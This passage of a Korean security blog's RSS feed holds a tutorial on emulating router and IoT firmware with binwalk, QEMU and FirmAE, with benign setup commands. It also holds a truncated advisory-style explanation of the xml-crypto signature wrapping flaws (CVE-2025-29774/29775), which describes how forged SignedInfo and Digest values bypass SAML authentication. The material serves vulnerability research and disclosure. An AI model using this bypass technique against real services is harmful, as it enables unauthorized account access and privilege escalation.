&#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xB2CC;&#xD150;&#xB3C4;&#xC640; &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xAC8C;&#xC784;&#xC744; &#xC990;&#xAE30;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAC8C;&#xC784;&#xC758; &#xBAA8;&#xB4E0; &#xAE30;&#xB2A5;&#xC774; &#xC798; &#xB3CC;&#xC544;&#xAC00;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F4F1;</p><p><img src="image03.png" alt="image03.png"></p><p>&#xB458;&#xC744; &#xC5EE;&#xC5B4;&#xC11C; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xCC98;&#xB7FC; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="image04.jpg" alt="image04.jpg"></p><p>&#xB2E4;&#xC2DC; &#xB3CC;&#xC544;&#xC640;&#xC11C;, &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9;&#xC5D0;&#xC11C;&#xB294; &#xD68D;&#xB4DD;&#xD55C; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC8FC;&#xBAA9;&#xC801;&#xC785;&#xB2C8;&#xB2E4;. &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC7A5;&#xBE44;&#xC758; &#xACBD;&#xC6B0; &#xC5EC;&#xB7EC; &#xC13C;&#xC11C;&#xC640; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB85C; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xAD00;&#xB828; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC758;&#xC874;&#xC131;&#xC774; &#xCDA9;&#xC871;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC2DC;&#xC2A4;&#xD15C;&#xC740; RISC &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC740;&#xB370;, &#xC774;&#xB294; &#xC8FC; &#xBD84;&#xC11D; &#xD658;&#xACBD;&#xC758; CISC &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC640; &#xB2E4;&#xB978; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xAD6C;&#xB3D9;&#xC744; &#xC2DC;&#xCF1C;&#xC57C; &#xD558;&#xB294; &#xC0C1;&#xD669;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC7A5;&#xBE44;&#xC758; &#xBAA8;&#xB4E0; &#xAE30;&#xB2A5;&#xC744; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC138;&#xBD80; &#xAE30;&#xB2A5;&#xAE4C;&#xC9C0; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#x1F477;&#x1F3FB;</p><p>&#xB530;&#xB77C;&#xC11C;, &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xBC14;&#xB77C;&#xBCF4;&#xACE0; &#xAD00;&#xB828; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xCD95;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9; &#xBD84;&#xC57C;&#xC758; &#xB2E4;&#xB978; &#xAE00;&#xB4E4; &#xB610;&#xD55C; &#xD38C;&#xC6E8;&#xC5B4; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC73C;&#xB85C; &#xC791;&#xC131;&#xB41C; &#xAE00;&#xC774; &#xB9CE;&#xC740; &#xAC83;&#xC774; &#xC774;&#xB97C; &#xC99D;&#xBA85;&#xD55C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;!</p><h2 id="2-&#xD38C;&#xC6E8;&#xC5B4;-&#xBD84;&#xC11D;"><a href="#2-&#xD38C;&#xC6E8;&#xC5B4;-&#xBD84;&#xC11D;" class="headerlink" title="2. &#xD38C;&#xC6E8;&#xC5B4; &#xBD84;&#xC11D;"></a>2. &#xD38C;&#xC6E8;&#xC5B4; &#xBD84;&#xC11D;</h2><p>&#xD38C;&#xC6E8;&#xC5B4; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD574;&#xB2F9; &#xD38C;&#xC6E8;&#xC5B4;&#xAC00; &#xC5B4;&#xB5A4; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xAD6C;&#xCD95;&#xB418;&#xACE0; &#xB3D9;&#xC791; &#xB418;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC6B0;&#xC120;&#xC785;&#xB2C8;&#xB2E4;. &#x261D;&#x1F3FB;</p><p><img src="image05.jpg" alt="image05.jpg"></p><p>binwalk&#xB85C; &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xB294; &#xC815;&#xBCF4;&#xB294; &#xD06C;&#xAC8C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. 3&#xFE0F;&#x20E3;</p><ul><li>&#xC544;&#xD0A4;&#xD14D;&#xCC98;</li><li>&#xCEE4;&#xB110;</li><li>&#xB8E8;&#xD2B8; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;</li></ul><p>binwalk&#xB97C; &#xD1B5;&#xD574; &#xC608;&#xC81C; &#xD38C;&#xC6E8;&#xC5B4;&#xC758; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC640; &#xCEE4;&#xB110; &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xC54C;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">binwalk firmware.bin</code></pre><p><img src="image06.png" alt="image06.png"></p><p><code>-A</code> &#xC635;&#xC158;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC758; &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xC815;&#xBCF4;&#xB97C; &#xB354; &#xC0C1;&#xC138;&#xD788; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F50D;</p><p><code>-e</code> &#xC635;&#xC158;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD55C; &#xC601;&#xC5ED;&#xB4E4;&#xC758; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xCD94;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>binwalk&#xB85C; &#xCD94;&#xCD9C;&#xD55C; &#xD30C;&#xC77C; &#xBA85;&#xC774; &#xC22B;&#xC790;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xB294;&#xB370;, &#xC774;&#xB294; &#xAC01; &#xC601;&#xC5ED;&#xB9C8;&#xB2E4; &#xAD6C;&#xBD84;&#xD574;&#xC11C; &#xB530;&#xB85C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. binwalk &#xBA85;&#xB839;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB9CC; &#xD30C;&#xC77C;&#xB4E4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xC5B4;&#xB5A4; &#xD30C;&#xC77C;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">binwalk -e firmware.binbinwalk -A kernel</code></pre><p><img src="image07.png" alt="image07.png"></p><p>&#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; ARM, MIPS &#xB4F1;&#xACFC; &#xAC19;&#xC740; RISC &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; ARM, MIPS&#xB3C4; &#xC5D4;&#xB514;&#xC548;&#xC5D0; &#xB530;&#xB77C; &#xBA85;&#xCE6D;&#xC5D0; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F95A;</p><p>mips&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE45; &#xC5D4;&#xB514;&#xC548;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. mipsel&#xC740; &#xB9AC;&#xD2C0; &#xC5D4;&#xB514;&#xC548;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xBA85;&#xCE6D;&#xC758; &#xCC28;&#xC774;&#xC758; &#xC720;&#xC758;&#xD558;&#xBA74; &#xB418;&#xACE0;, &#xC774;&#xB294; binwalk&#xC5D0;&#xC11C; &#xC5B4;&#xB5A4; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC9C0; &#xC798; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD655;&#xC778;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="3-QEMU"><a href="#3-QEMU" class="headerlink" title="3. QEMU"></a>3. QEMU</h2><p>&#xD38C;&#xC6E8;&#xC5B4; &#xC815;&#xBCF4;&#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC600;&#xB2E4;&#xBA74;, &#xC774;&#xC81C; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. &#xD38C;&#xC6E8;&#xC5B4;&#xB294; QEMU &#xAC00;&#xC0C1; &#xBA38;&#xC2E0; &#xC704;&#xC5D0; &#xC62C;&#xB824;&#xC11C; &#xB3D9;&#xC791; &#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F4A8;</p><p><img src="image08.jpg" alt="image08.jpg"></p><p>QEMU&#xB294; &#xAC00;&#xC0C1;&#xD654; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB85C;, &#xBE60;&#xB978; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xCD95;&#xD560; &#xB54C; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC635;&#xC158;&#xC73C;&#xB85C; &#xAD00;&#xB828; &#xCEE4;&#xB110;, &#xC774;&#xBBF8;&#xC9C0; &#xB4F1;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC124;&#xCE58;&#xB294; apt&#xB85C; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xC720;&#xAE30; &#xD38C;&#xC6E8;&#xC5B4;&#xC758; &#xACBD;&#xC6B0; &#xBCF4;&#xD1B5; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xC678;&#xC758; &#xD2B9;&#xBCC4;&#xD55C; &#xC758;&#xC874; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB098; &#xC13C;&#xC11C;&#xAC00; &#xC5C6;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xAD00;&#xB828; &#xCEE4;&#xB110; &#xBC0F; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xB9DE;&#xCD98;&#xB2E4;&#xBA74; &#xBC14;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xB9C1;&#xD06C;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC758; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F4BE;</p><p><a href="https://people.debian.org/~aurel32/qemu/">https://people.debian.org/~aurel32/qemu/</a></p><p>&#xAD00;&#xB828; &#xD30C;&#xC77C;&#xC744; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xB9DE;&#xCD94;&#xACE0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC138;&#xD305; &#xD6C4; &#xAD6C;&#xB3D9;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xACF5;&#xC720;&#xAE30; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xC2E4;&#xC81C; &#xB8E8;&#xD2B8; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F310;</p><p><img src="image09.jpg" alt="image09.jpg"></p><p>&#xCD9C;&#xCC98;: Bach`s Blog</p><h2 id="4-FirmAE"><a href="#4-FirmAE" class="headerlink" title="4. FirmAE"></a>4. FirmAE</h2><p>QEMU&#xB294; &#xC9C1;&#xC811; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC138;&#xD305;&#xACFC; &#xAD00;&#xB828; &#xD30C;&#xC77C;&#xC744; &#xC190;&#xC218; &#xB9DE;&#xCD94;&#xC5B4;&#xC57C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB2E4;&#xC18C; &#xBD88;&#xD3B8;&#xD55C; &#xBD80;&#xBD84;&#xC774; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC;, &#xC778;&#xAC04;&#xC740; &#xB610; &#xBC29;&#xBC95;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xB193;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xB7F0; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC744; &#xBCF4;&#xB2E4; &#xC190;&#xC27D;&#xAC8C; &#xB3C4;&#xC640;&#xC8FC;&#xB294; &#xB3C4;&#xAD6C;&#xAC00; &#xC788;&#xC73C;&#xB2C8;&#x2026;</p><p>&#xC774; &#xAE00;&#xC758; &#xC8FC;&#xC81C;&#xC778; FirmAE&#xC785;&#xB2C8;&#xB2E4;! &#x1F941;</p><p><a href="https://github.com/pr0v3rbs/FirmAE">https://github.com/pr0v3rbs/FirmAE</a></p><p><img src="image10.png" alt="image10.png"></p><p>FirmAE&#xB294; KAIST SysSec Lab&#xC5D0;&#xC11C; &#xC81C;&#xC791;&#xD55C; &#xD38C;&#xC6E8;&#xC5B4; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305; &#xC790;&#xB3D9;&#xD654; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;! &#xC5F0;&#xAD6C;&#xD300;&#xC740; &#xACF5;&#xC720;&#xAE30;&#xC640; IP &#xCE74;&#xBA54;&#xB77C; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xBBF8;&#xC9C0;&#xB4E4;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD558;&#xC5EC; &#xBCF4;&#xB2E4; &#xC190;&#xC27D;&#xAC8C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC744; &#xB3C4;&#xC640;&#xC8FC;&#xB294; &#xB3C4;&#xAD6C;&#xB97C; &#xC81C;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. FirmAE&#xB294; QEMU&#xC640; Binwalk &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC81C;&#xC791;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F528;</p><p>github&#xC5D0;&#xC11C; &#xC124;&#xCE58; &#xBC0F; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash"><span class="hljs-comment"># &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC0F; &#xC138;&#xD305;</span>sudo apt-get install -y bc fdisk qemu qemu-system-mips64 python3-psycopg2git <span class="hljs-built_in">clone</span> --recursive https://github.com/pr0v3rbs/FirmAE<span class="hljs-built_in">cd</span> ./FirmAE./download.sh./install.sh./init.sh<span class="hljs-comment"># FirmAE/firmwares &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xB3D9;</span>sudo ./run.sh -c VENDOR ./firmwares/sudo ./run.sh -d VENDOR ./firmwares/</code></pre><p>FirmAE&#xB85C; &#xC608;&#xC81C; &#xACF5;&#xC720;&#xAE30; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305; &#xC2DC;&#xD0A4;&#xBA74;, &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xACF5;&#xC720;&#xAE30; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC2DC;&#xAC04;&#xC774; &#xAF64;&#xB098; &#xB9CE;&#xC774; &#xC18C;&#xC694;&#xB418;&#xB2C8;, &#xC778;&#xB0B4;&#xC2EC;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xAE30;&#xB2E4;&#xB9AC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xD3C9;&#xADE0; 2-30&#xBD84;(!) &#xC815;&#xB3C4; &#xC18C;&#xC694;&#xB41C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#x2615;</p><p><img src="image11.png" alt="image11.png"></p><p>&#xADF8;&#xB7EC;&#xB098; FirmAE&#xB294; &#xC635;&#xC158;&#xC5D0;&#xB3C4; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774;, &#xC5F0;&#xAD6C;&#xD300;&#xC774; &#xAE30;&#xC874;&#xC5D0; &#xD14C;&#xC2A4;&#xD2B8; &#xC2DC;&#xCF1C; &#xB193;&#xC740; &#xC720;&#xBA85; &#xD68C;&#xC0AC;&#xC758; &#xACF5;&#xC720;&#xAE30;&#xC640; IP &#xCE74;&#xBA54;&#xB77C; &#xC81C;&#xD488; &#xBC0F; &#xBAA8;&#xB378;&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC81C;&#xC791;&#xC774; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC18C;&#xC218;&#xC758; &#xD2B9;&#xC815; &#xC81C;&#xD488;&#xC774;&#xB098; &#xB2E4;&#xB978; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xBC0F; IoT &#xAE30;&#xAE30;&#xC5D0;&#xB294; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC774; &#xC798; &#xC548;&#xB418;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC885;&#xC885; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; gdbserver &#xAE30;&#xB2A5; &#xB610;&#xD55C; &#xC81C;&#xACF5;&#xB418;&#xB294;&#xB370;, &#xC774; &#xC5ED;&#xC2DC; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F972;</p><p><img src="image12.jpg" alt="image12.jpg"></p><p>&#xB2E4;&#xC74C; part2&#xC5D0;&#xC11C;&#xB294; FirmAE&#xC758; &#xB0B4;&#xBD80; &#xAD6C;&#xC131;&#xACFC; &#xB3D9;&#xC791;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xACE0;, &#xB2E4;&#xB978; &#xD658;&#xACBD; &#xBC0F; &#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xB3C4; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xACE0;, &#xC81C;&#xACF5;&#xD558;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC798; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xD558;&#xB294; &#xAE00;&#xB85C; &#xCC3E;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#x1F919;&#x1F3FB;</p><p>&#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/firmware/">firmware</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Embedded/">Embedded</category>
      
      <category domain="https://hackyboiz.github.io/tags/Emulation/">Emulation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-29774, CVE-2025-29775 : xml-crypto의 XML Signature Wrapping 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/07/romi0x/1day1line0507/</link>
      <guid>https://hackyboiz.github.io/2025/05/07/romi0x/1day1line0507/</guid>
      <pubDate>Wed, 07 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://workos.com/blog/samlstorm&quot;&gt;https://workos.com/blo</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://workos.com/blog/samlstorm">https://workos.com/blog/samlstorm</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>xml-crypto &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; (&#xBC84;&#xC804; &lt;= 6.0.0)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC774;&#xBC88; &#xCDE8;&#xC57D;&#xC810;&#xC740; XML &#xB514;&#xC9C0;&#xD138; &#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC758; &#xD5C8;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC; SAML &#xC751;&#xB2F5; &#xB610;&#xB294; XML &#xC11C;&#xBA85; &#xAE30;&#xBC18; &#xC778;&#xC99D; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>xml-crypto</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC758; &#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xBC29;&#xC2DD;&#xC758; &#xAD6C;&#xC870;&#xC801; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xBE44;&#xB86F;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. CVE-2025-29774&#xC640; CVE-2025-29775 &#xB450; &#xAC74;&#xC73C;&#xB85C; &#xB098;&#xB258;&#xC5B4; &#xACF5;&#xAC1C;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>CVE-2025-29774</strong>&#xB294; &#x201C;SignedInfo &#xB178;&#xB4DC; &#xC911;&#xBCF5;&#x201D;&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC11C;&#xBA85;&#xB41C; XML &#xBB38;&#xC11C;&#xB294; <code>&lt;Signature&gt;</code> &#xB178;&#xB4DC; &#xB0B4;&#xC5D0; &#xB2E8; &#xD558;&#xB098;&#xC758; <code>&lt;SignedInfo&gt;</code> &#xB178;&#xB4DC;&#xB9CC; &#xC874;&#xC7AC;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>xml-crypto</code>&#xC758; &#xCDE8;&#xC57D; &#xBC84;&#xC804;&#xC740; &#xB2E4;&#xC218;&#xC758; <code>&lt;SignedInfo&gt;</code> &#xB178;&#xB4DC;&#xAC00; &#xC788;&#xC744; &#xACBD;&#xC6B0;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC0BD;&#xC785;&#xD55C; &#xAC00;&#xC9DC; <code>&lt;SignedInfo&gt;</code>&#xAC00; &#xC544;&#xB2CC; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xAC83;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD558;&#xB098;&#xB294; &#xC720;&#xD6A8;&#xD55C; SignedInfo&#xB85C; &#xB0A8;&#xACA8;&#xB450;&#xACE0;, &#xB2E4;&#xB978; &#xD558;&#xB098;&#xB294; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774;&#xB098; &#xC0AC;&#xC6A9;&#xC790; &#xBCC0;&#xC870;&#xC640; &#xAC19;&#xC740; &#xC545;&#xC758;&#xC801; &#xC870;&#xC791;&#xC744; &#xD3EC;&#xD568;&#xD574; &#xC11C;&#xBA85;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xACF5;&#xACA9; &#xC608;&#xC2DC;&#xC5D0;&#xC11C;&#xB294; <code>&lt;Signature&gt;</code> &#xBE14;&#xB85D; &#xB0B4;&#xC5D0; &#xB450; &#xAC1C;&#xC758; <code>&lt;SignedInfo&gt;</code>&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xACE0;, &#xD558;&#xB098;&#xC5D0; &#xC704;&#xC870;&#xB41C; Digest &#xAC12;&#xC744; &#xD3EC;&#xD568;&#xD574; &#xC778;&#xC99D; &#xC6B0;&#xD68C;&#xB97C; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>CVE-2025-29775</strong>&#xB294; DigestValue &#xC870;&#xC791;&#xC744; 